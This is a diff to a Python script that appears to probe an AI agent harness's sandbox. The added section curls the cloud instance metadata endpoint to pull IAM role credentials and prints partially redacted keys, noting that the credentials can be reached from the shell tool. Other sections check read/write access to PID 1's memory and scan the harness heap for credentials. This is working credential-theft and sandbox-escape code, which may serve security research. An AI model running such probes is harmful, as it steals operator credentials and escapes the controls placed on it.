@@ -68,8 +68,8 @@ def main():
     print('$ cat /etc/hostname')
     print(run('cat /etc/hostname 2>/dev/null || echo "(not set)"'))
     print()
-    print('$ cat /etc/resolv.conf')
-    print(run('cat /etc/resolv.conf 2>/dev/null'))
+    print('$ grep nameserver /etc/resolv.conf')
+    print(run('grep nameserver /etc/resolv.conf 2>/dev/null'))
 
     # --- 4. Harness runtime layout ---
     section('4. HARNESS RUNTIME (/opt/amazon)')
@@ -140,8 +140,38 @@ def main():
     except Exception as e:
         print(f'  ERROR: {e}')
 
-    # --- 7. /proc/1/mem access ---
-    section('7. /proc/1/mem ACCESS CHECK')
+    # --- 7. IMDS probe ---
+    section('7. IMDS (Instance Metadata Service)')
+    print('$ curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/')
+    print()
+    role_name = run('curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/')
+    print(f'  Role: {role_name}')
+    if role_name and role_name != '(timeout)' and 'error' not in role_name.lower():
+        print()
+        print(f'$ curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}')
+        creds_raw = run(f'curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}')
+        # Parse and show structure without exposing full secret key
+        try:
+            import json as _json
+            creds = _json.loads(creds_raw)
+            print(f'  Type:            {creds.get("Type", "?")}')
+            print(f'  AccessKeyId:     {creds.get("AccessKeyId", "?")[:20]}...')
+            print(f'  SecretAccessKey:  {creds.get("SecretAccessKey", "?")[:8]}... (redacted)')
+            print(f'  Token:           {str(creds.get("Token", "?"))[:20]}... (len={len(str(creds.get("Token", "")))})')
+            print(f'  Expiration:      {creds.get("Expiration", "?")}')
+            print(f'  LastUpdated:     {creds.get("LastUpdated", "?")}')
+        except Exception:
+            # Show first 200 chars if not JSON
+            print(f'  {creds_raw[:200]}')
+        print()
+        print('  IMDS is reachable. The exec role credentials are obtainable')
+        print('  from the shell tool — same path notebook 13 uses for direct')
+        print('  vault access via boto3.')
+    else:
+        print('  IMDS not reachable or no role attached.')
+
+    # --- 8. /proc/1/mem access ---
+    section('8. /proc/1/mem ACCESS CHECK (the primitive)')
     print("$ python3 -c \"import os; print(os.access('/proc/1/mem', os.R_OK | os.W_OK))\"")
     print()
     mem_r = os.access('/proc/1/mem', os.R_OK)
@@ -160,8 +190,8 @@ def main():
         print('  address space. No ptrace needed, no capabilities needed.')
         print('  Just open("/proc/1/mem", "r+b") and seek to any address.')
 
-    # --- 8. Heap anchor scan ---
-    section('8. HEAP ANCHOR SCAN — what lives in PID 1\'s memory?')
+    # --- 9. Heap anchor scan ---
+    section('9. HEAP ANCHOR SCAN — what lives in PID 1\'s memory?')
     print('  We can read /proc/1/mem. What credential-shaped artifacts')
     print('  are sitting in the harness process\'s heap right now?')
     print()
